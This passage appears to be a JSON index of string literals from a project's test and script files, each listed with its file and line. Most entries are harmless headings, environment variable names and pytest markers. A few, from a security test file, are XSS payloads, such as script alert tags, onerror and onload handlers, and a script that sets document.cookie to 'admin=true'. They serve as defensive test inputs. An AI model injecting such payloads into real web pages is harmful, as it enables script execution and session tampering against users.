    "<!DOCTYPE html>\n<html>\n<head>\n    <title>Real Service Test Report</title>\n    <style>\n        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }\n        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }\n        h1 { color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }\n        h2 { color: #555; margin-top: 30px; }\n        .metric-card { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #007bff; }\n        .success { color: #28a745; font-weight: bold; }\n        .failure { color: #dc3545; font-weight: bold; }\n        .warning { color: #ffc107; }\n        table { width: 100%; border-collapse: collapse; margin: 15px 0; }\n        th { background: #007bff; color: white; padding: 10px; text-align: left; }\n        td { padding: 10px; border-bottom: 1px solid #ddd; }\n        tr:hover { background: #f5f5f5; }\n        .chart { margin: 20px 0; }\n        .progress-bar { width: 100%; height: 30px; background: #e9ecef; border-radius: 5px; overflow: hidden; }\n        .progress-fill { height: 100%; background: linear-gradient(90deg, #28a745, #20c997); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }\n    </style>\n    <script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Real Service Test Report</h1>": {
      "value": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Real Service Test Report</title>\n    <style>\n        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }\n        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }\n        h1 { color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }\n        h2 { color: #555; margin-top: 30px; }\n        .metric-card { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #007bff; }\n        .success { color: #28a745; font-weight: bold; }\n        .failure { color: #dc3545; font-weight: bold; }\n        .warning { color: #ffc107; }\n        table { width: 100%; border-collapse: collapse; margin: 15px 0; }\n        th { background: #007bff; color: white; padding: 10px; text-align: left; }\n        td { padding: 10px; border-bottom: 1px solid #ddd; }\n        tr:hover { background: #f5f5f5; }\n        .chart { margin: 20px 0; }\n        .progress-bar { width: 100%; height: 30px; background: #e9ecef; border-radius: 5px; overflow: hidden; }\n        .progress-fill { height: 100%; background: linear-gradient(90deg, #28a745, #20c997); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }\n    </style>\n    <script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Real Service Test Report</h1>",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:236"
      ]
    },
    "</div></body></html>": {
      "value": "</div></body></html>",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:267"
      ]
    },
    "<30": {
      "value": "<30",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:149"
      ]
    },
    "<iframe src=javascript:alert('XSS')></iframe>": {
      "value": "<iframe src=javascript:alert('XSS')></iframe>",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:96"
      ]
    },
    "<img src=x onerror=alert('XSS')>": {
      "value": "<img src=x onerror=alert('XSS')>",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:93"
      ]
    },
    "<script>": {
      "value": "<script>",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1250",
        "auth_service/tests/test_security.py:266",
        "auth_service/tests/test_security.py:305",
        "auth_service/tests/test_security.py:321"
      ]
    },
    "<script>alert('XSS')</script>": {
      "value": "<script>alert('XSS')</script>",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:91"
      ]
    },
    "<script>alert('xss')</script>": {
      "value": "<script>alert('xss')</script>",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:450"
      ]
    },
    "<script>document.cookie='admin=true'</script>": {
      "value": "<script>document.cookie='admin=true'</script>",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:100"
      ]
    },
    "<svg onload=alert('XSS')>": {
      "value": "<svg onload=alert('XSS')>",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:95"
      ]
    },
    "=": {
      "value": "=",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:150",
        "auth_service/test_actual_staging_credentials.py:170",
        "auth_service/test_staging_db_connection.py:279",
        "auth_service/test_staging_db_connection.py:315",
        "auth_service/test_url_construction.py:216",
        "auth_service/test_url_construction.py:236",
        "auth_service/tests/config/test_env.py:123",
        "auth_service/tests/integration/test_auth_oauth_errors.py:133",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:177",
        "auth_service/tests/test_auth_token_security.py:106"
      ]
    },
    "=== AUTHENTICATION TESTS ===": {
      "value": "=== AUTHENTICATION TESTS ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:113"
      ]
    },
    "=== Agent Initialization Tests ===": {
      "value": "=== Agent Initialization Tests ===",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:185"
      ]
    },
    "=== Analyzing Connection Issue ===": {
      "value": "=== Analyzing Connection Issue ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:155"
      ]
    },
    "=== Analyzing Database Name Configuration ===": {
      "value": "=== Analyzing Database Name Configuration ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:92"
      ]
    },
    "=== BASIC FUNCTIONALITY TESTS ===": {
      "value": "=== BASIC FUNCTIONALITY TESTS ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:82"
      ]
    },
    "=== Checking Cloud SQL Proxy Status ===": {
      "value": "=== Checking Cloud SQL Proxy Status ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:224"
      ]
    },
    "=== Checking PostgreSQL Availability ===": {
      "value": "=== Checking PostgreSQL Availability ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:129"
      ]
    },
    "=== Final Summary ===": {
      "value": "=== Final Summary ===",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:92"
      ]
    },
    "=== L3 Test File Standardization ===": {
      "value": "=== L3 Test File Standardization ===",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:226"
      ]
    },
    "=== Mock Analysis Summary ===": {
      "value": "=== Mock Analysis Summary ===",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:166"
      ]
    },
    "=== Next Steps to Resolve Auth Database Issue ===": {
      "value": "=== Next Steps to Resolve Auth Database Issue ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:117"
      ]
    },
    "=== OUTPUT FORMAT TESTS ===": {
      "value": "=== OUTPUT FORMAT TESTS ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:157"
      ]
    },
    "=== Progress:": {
      "value": "=== Progress:",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:121"
      ]
    },
    "=== REPOSITORY HANDLING TESTS ===": {
      "value": "=== REPOSITORY HANDLING TESTS ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:135"
      ]
    },
    "=== Summary ===": {
      "value": "=== Summary ===",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:281"
      ]
    },
    "=== Test Results ===": {
      "value": "=== Test Results ===",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:201"
      ]
    },
    "=== Testing Auth Client Environment Detection ===": {
      "value": "=== Testing Auth Client Environment Detection ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:13"
      ]
    },
    "=== Testing Auth Service Database Connection ===": {
      "value": "=== Testing Auth Service Database Connection ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:67"
      ]
    },
    "=== Testing AuthConfig ===": {
      "value": "=== Testing AuthConfig ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:168"
      ]
    },
    "=== Testing AuthConfig Integration ===": {
      "value": "=== Testing AuthConfig Integration ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:127"
      ]
    },
    "=== Testing Backend Service Database Connection ===": {
      "value": "=== Testing Backend Service Database Connection ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:24"
      ]
    },
    "=== Testing Cloud SQL Connector Availability ===": {
      "value": "=== Testing Cloud SQL Connector Availability ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:110"
      ]
    },
    "=== Testing Connection with AuthConfig URL ===": {
      "value": "=== Testing Connection with AuthConfig URL ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:189"
      ]
    },
    "=== Testing DatabaseURLBuilder ===": {
      "value": "=== Testing DatabaseURLBuilder ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:117"
      ]
    },
    "=== Testing Direct asyncpg Connection ===": {
      "value": "=== Testing Direct asyncpg Connection ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:50"
      ]
    },
    "=== Testing Middleware Environment Defaults ===": {
      "value": "=== Testing Middleware Environment Defaults ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:67"
      ]
    },
    "=== Testing OAuth Config Fallback ===": {
      "value": "=== Testing OAuth Config Fallback ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:127"
      ]
    },
    "=== Testing Schema Defaults ===": {
      "value": "=== Testing Schema Defaults ===",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:109"
      ]
    },
    "=== Testing TCP Fallback Connection ===": {
      "value": "=== Testing TCP Fallback Connection ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:87"
      ]
    },
    "=== Testing URL Construction ===": {
      "value": "=== Testing URL Construction ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:53"
      ]
    },
    "=== Testing URL Generation with Actual Credentials ===": {
      "value": "=== Testing URL Generation with Actual Credentials ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:52"
      ]
    },
    "=== Top 10 Unjustified Mocks to Fix ===": {
      "value": "=== Top 10 Unjustified Mocks to Fix ===",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:174"
      ]
    },
    "=== Validating Staging Credentials ===": {
      "value": "=== Validating Staging Credentials ===",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:253"
      ]
    },
    ">": {
      "value": ">",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:366",
        "scripts/test_error_monitor_logic.py:99",
        "scripts/test_error_monitor_logic.py:102"
      ]
    },
    "?": {
      "value": "?",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:100",
        "scripts/compliance/test_refactor_helper.py:725"
      ]
    },
    "? Password seems short (": {
      "value": "? Password seems short (",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:183"
      ]
    },
    "? Using non-standard user:": {
      "value": "? Using non-standard user:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:178"
      ]
    },
    "?host=/cloudsql/": {
      "value": "?host=/cloudsql/",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:106",
        "auth_service/test_url_construction.py:107"
      ]
    },
    "@": {
      "value": "@",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:149",
        "auth_service/tests/database/test_config.py:110",
        "auth_service/tests/database/test_config.py:122",
        "auth_service/tests/database/test_config.py:147",
        "scripts/auto_fix_test_sizes.py:566",
        "scripts/compliance/test_fixer.py:195",
        "scripts/test_config_loading.py:119",
        "scripts/test_config_loading.py:120"
      ]
    },
    "@/utils/connection-status-utils": {
      "value": "@/utils/connection-status-utils",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:10"
      ]
    },
    "@abstractmethod": {
      "value": "@abstractmethod",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:223"
      ]
    },
    "@domain.com": {
      "value": "@domain.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:399",
        "auth_service/tests/test_security.py:403"
      ]
    },
    "@example.com": {
      "value": "@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:37",
        "auth_service/tests/factories/user_factory.py:38",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1162",
        "auth_service/tests/test_auth_token_generation.py:180",
        "auth_service/tests/test_security.py:256",
        "auth_service/tests/test_token_blacklisting_basics.py:220"
      ]
    },
    "@gmail.com": {
      "value": "@gmail.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:190"
      ]
    },
    "@localhost:": {
      "value": "@localhost:",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:148"
      ]
    },
    "@mock_justified": {
      "value": "@mock_justified",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:81"
      ]
    },
    "@patch": {
      "value": "@patch",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:385",
        "scripts/compliance/project_test_validator.py:274",
        "scripts/compliance/real_test_requirements_enforcer.py:359"
      ]
    },
    "@patch\\([\\'\"]([^\\'\"]*)[\\'\"].*?\\)": {
      "value": "@patch\\([\\'\"]([^\\'\"]*)[\\'\"].*?\\)",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:96"
      ]
    },
    "@pytest.": {
      "value": "@pytest.",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:153"
      ]
    },
    "@pytest.mark.": {
      "value": "@pytest.mark.",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:82",
        "scripts/add_test_markers.py:116"
      ]
    },
    "@pytest.mark.e2e": {
      "value": "@pytest.mark.e2e",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:57"
      ]
    },
    "@pytest.mark.integration": {
      "value": "@pytest.mark.integration",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:55"
      ]
    },
    "@pytest.mark.mock_only": {
      "value": "@pytest.mark.mock_only",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:51"
      ]
    },
    "@pytest.mark.real_clickhouse": {
      "value": "@pytest.mark.real_clickhouse",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:45"
      ]
    },
    "@pytest.mark.real_database": {
      "value": "@pytest.mark.real_database",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:41"
      ]
    },
    "@pytest.mark.real_llm": {
      "value": "@pytest.mark.real_llm",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:39",
        "scripts/add_test_markers.py:182"
      ]
    },
    "@pytest.mark.real_redis": {
      "value": "@pytest.mark.real_redis",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:43"
      ]
    },
    "@pytest.mark.real_services": {
      "value": "@pytest.mark.real_services",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:49"
      ]
    },
    "@pytest.mark.skip": {
      "value": "@pytest.mark.skip",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:286"
      ]
    },
    "@pytest.mark.skipif(\n    os.environ.get(\"ENABLE_REAL_LLM_TESTING\") != \"true\",\n    reason=\"Real LLM tests disabled. Set ENABLE_REAL_LLM_TESTING=true to run\"\n)": {
      "value": "@pytest.mark.skipif(\n    os.environ.get(\"ENABLE_REAL_LLM_TESTING\") != \"true\",\n    reason=\"Real LLM tests disabled. Set ENABLE_REAL_LLM_TESTING=true to run\"\n)",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:189"
      ]
    },
    "@pytest.mark.unit": {
      "value": "@pytest.mark.unit",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:53"
      ]
    },
    "@pytest\\.fixture.*?\\ndef\\s+(\\w+)": {
      "value": "@pytest\\.fixture.*?\\ndef\\s+(\\w+)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:228"
      ]
    },
    "@skip": {
      "value": "@skip",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:286"
      ]
    },
    "@users.noreply.github.com": {
      "value": "@users.noreply.github.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:224"
      ]
    },
    "A": {
      "value": "A",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:123",
        "auth_service/tests/unit/test_oauth_state_security.py:63",
        "auth_service/tests/unit/test_oauth_state_security.py:63"
      ]
    },
    "ABC": {
      "value": "ABC",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:211",
        "scripts/remove_test_stubs.py:223"
      ]
    },
    "ACCESS_TOKEN_EXPIRE_MINUTES": {
      "value": "ACCESS_TOKEN_EXPIRE_MINUTES",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:24",
        "auth_service/tests/config/test_settings.py:178"
      ]
    },
    "ACCOUNT_LOCKED": {
      "value": "ACCOUNT_LOCKED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:24",
        "auth_service/tests/factories/audit_factory.py:189"
      ]
    },
    "ACCOUNT_LOCKOUT_DURATION": {
      "value": "ACCOUNT_LOCKOUT_DURATION",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:60"
      ]
    },
    "ACCOUNT_UNLOCKED": {
      "value": "ACCOUNT_UNLOCKED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:25"
      ]
    },
    "ACT": {
      "value": "ACT",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:241"
      ]
    },
    "ACT: ${{ env.ACT }}": {
      "value": "ACT: ${{ env.ACT }}",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:229",
        "scripts/test_workflows_with_act.py:254",
        "scripts/test_workflows_with_act.py:256"
      ]
    },
    "ACTION REQUIRED": {
      "value": "ACTION REQUIRED",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:106"
      ]
    },
    "ACTUALLY": {
      "value": "ACTUALLY",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:338"
      ]
    },
    "ALL DATABASE CONNECTION TESTS PASSED!": {
      "value": "ALL DATABASE CONNECTION TESTS PASSED!",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:118"
      ]
    },
    "ALL TESTS PASSED": {
      "value": "ALL TESTS PASSED",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:401",
        "scripts/test_database_url_builder_comprehensive.py:352",
        "scripts/test_error_monitor_logic.py:240",
        "scripts/test_ssl_certificates_staging.py:309",
        "scripts/test_staging_migrations.py:329"
      ]
    },
    "ALLOWED conftest.py files (service-level):": {
      "value": "ALLOWED conftest.py files (service-level):",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:78"
      ]
    },
    "ALLOWED_HOSTS": {
      "value": "ALLOWED_HOSTS",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:55",
        "auth_service/tests/config/test_settings.py:195"
      ]
    },
    "ALLOW_DEV_LOGIN": {
      "value": "ALLOW_DEV_LOGIN",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:240"
      ]
    },
    "ALLOW_PROD_TESTS": {
      "value": "ALLOW_PROD_TESTS",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:597",
        "scripts/unified_test_runner.py:599"
      ]
    },
    "ANTHROPIC_API_KEY": {
      "value": "ANTHROPIC_API_KEY",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:84",
        "scripts/test_backend.py:84"
      ]
    },
    "API Agents": {
      "value": "API Agents",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:108"
      ]
    },
    "API Documentation": {
      "value": "API Documentation",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:43",
        "scripts/test_staging_env.py:147"
      ]
    },
    "API Threads List": {
      "value": "API Threads List",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:104"
      ]
    },
    "API URL not found": {
      "value": "API URL not found",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:316"
      ]
    },
    "API Workspaces": {
      "value": "API Workspaces",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:106"
      ]
    },
    "API docs are accessible": {
      "value": "API docs are accessible",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:59"
      ]
    },
    "API docs check failed:": {
      "value": "API docs check failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:63"
      ]
    },
    "API docs returned status": {
      "value": "API docs returned status",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:61"
      ]
    },
    "API endpoint tests": {
      "value": "API endpoint tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:85"
      ]
    },
    "API endpoints test failed": {
      "value": "API endpoints test failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:202"
      ]
    },
    "API endpoints test failed:": {
      "value": "API endpoints test failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:163"
      ]
    },
    "API endpoints test passed": {
      "value": "API endpoints test passed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:159"
      ]
    },
    "API key configured": {
      "value": "API key configured",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:87"
      ]
    },
    "API port": {
      "value": "API port",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:207"
      ]
    },
    "API_BASE_URL": {
      "value": "API_BASE_URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:28",
        "scripts/unified_test_config.py:313"
      ]
    },
    "AST analysis failed for": {
      "value": "AST analysis failed for",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:221"
      ]
    },
    "AUTH DATABASE SESSION TEST SUMMARY": {
      "value": "AUTH DATABASE SESSION TEST SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:379"
      ]
    },
    "AUTH SERVICE DATABASE SESSION MANAGEMENT TESTING": {
      "value": "AUTH SERVICE DATABASE SESSION MANAGEMENT TESTING",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:349"
      ]
    },
    "AUTH_BASE_URL": {
      "value": "AUTH_BASE_URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:29"
      ]
    },
    "AUTH_FAST_TEST_MODE": {
      "value": "AUTH_FAST_TEST_MODE",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:28",
        "auth_service/tests/test_auth_startup_integration.py:41",
        "auth_service/tests/test_critical_oauth_environment_failures.py:49",
        "auth_service/tests/test_critical_oauth_environment_failures.py:93",
        "auth_service/tests/test_critical_oauth_environment_failures.py:133",
        "auth_service/tests/test_critical_oauth_environment_failures.py:171",
        "auth_service/tests/test_critical_oauth_environment_failures.py:178",
        "auth_service/tests/test_critical_oauth_environment_failures.py:187",
        "auth_service/tests/test_critical_oauth_environment_failures.py:198",
        "auth_service/tests/test_critical_oauth_environment_failures.py:269"
      ]
    },
    "AUTH_SERVICE_PORT": {
      "value": "AUTH_SERVICE_PORT",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:43"
      ]
    },
    "AUTH_SERVICE_URL": {
      "value": "AUTH_SERVICE_URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:44",
        "auth_service/tests/config/test_settings.py:191",
        "scripts/start_test_services.py:154",
        "scripts/test_oauth_local.py:63",
        "scripts/test_oauth_local.py:63",
        "scripts/unified_test_runner.py:184",
        "scripts/unified_test_runner.py:184"
      ]
    },
    "AUTH_USE_FILE_DB": {
      "value": "AUTH_USE_FILE_DB",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:33"
      ]
    },
    "AUTOCOMMIT": {
      "value": "AUTOCOMMIT",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:123",
        "auth_service/tests/database/test_config.py:148"
      ]
    },
    "AUTOMATED SPLITTING SUGGESTIONS (": {
      "value": "AUTOMATED SPLITTING SUGGESTIONS (",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:142"
      ]
    },
    "AVAILABLE TEST CATEGORIES": {
      "value": "AVAILABLE TEST CATEGORIES",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:873"
      ]
    },
    "AVAILABLE TEST LEVELS": {
      "value": "AVAILABLE TEST LEVELS",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:89"
      ]
    },
    "Accept": {
      "value": "Accept",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:25"
      ]
    },
    "Access token duration:": {
      "value": "Access token duration:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:272"
      ]
    },
    "Access-Control-Allow-Origin": {
      "value": "Access-Control-Allow-Origin",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:109"
      ]
    },
    "Access-Control-Request-Method": {
      "value": "Access-Control-Request-Method",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:109"
      ]
    },
    "Action Required:": {
      "value": "Action Required:",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:89"
      ]
    },
    "Action:": {
      "value": "Action:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:334"
      ]
    },
    "Active connections:": {
      "value": "Active connections:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:119"
      ]
    },
    "Actual file generation not yet implemented": {
      "value": "Actual file generation not yet implemented",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:596"
      ]
    },
    "Actual fixes require force_unsafe=True. Switching to dry-run mode.": {
      "value": "Actual fixes require force_unsafe=True. Switching to dry-run mode.",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:792"
      ]
    },
    "Actually valid:": {
      "value": "Actually valid:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:241"
      ]
    },
    "Add": {
      "value": "Add",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:240"
      ]
    },
    "Add assertions to": {
      "value": "Add assertions to",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:177"
      ]
    },
    "Add caching layer": {
      "value": "Add caching layer",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:406"
      ]
    },
    "Add circuit breakers": {
      "value": "Add circuit breakers",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:417"
      ]
    },
    "Add more end-to-end tests (current:": {
      "value": "Add more end-to-end tests (current:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:701"
      ]
    },
    "Add pytest markers to test files": {
      "value": "Add pytest markers to test files",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:233"
      ]
    },
    "Add security checks, request size limits": {
      "value": "Add security checks, request size limits",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:35"
      ]
    },
    "Added": {
      "value": "Added",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:212"
      ]
    },
    "Added missing typing imports": {
      "value": "Added missing typing imports",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:231"
      ]
    },
    "Added mock imports": {
      "value": "Added mock imports",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:237"
      ]
    },
    "Adding pytest markers to test files...": {
      "value": "Adding pytest markers to test files...",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:200"
      ]
    },
    "Additional arguments to pass to Jest": {
      "value": "Additional arguments to pass to Jest",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:78"
      ]
    },
    "Address critical bottlenecks immediately": {
      "value": "Address critical bottlenecks immediately",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:433"
      ]
    },
    "After examining the performance metrics, here are my recommendations:": {
      "value": "After examining the performance metrics, here are my recommendations:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:160"
      ]
    },
    "Agent-specific tests": {
      "value": "Agent-specific tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:115"
      ]
    },
    "Agent-specific tests with real LLMs": {
      "value": "Agent-specific tests with real LLMs",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:63"
      ]
    },
    "Aggregating coverage...": {
      "value": "Aggregating coverage...",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:787"
      ]
    },
    "Alembic Configuration": {
      "value": "Alembic Configuration",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:281"
      ]
    },
    "Algorithm": {
      "value": "Algorithm",
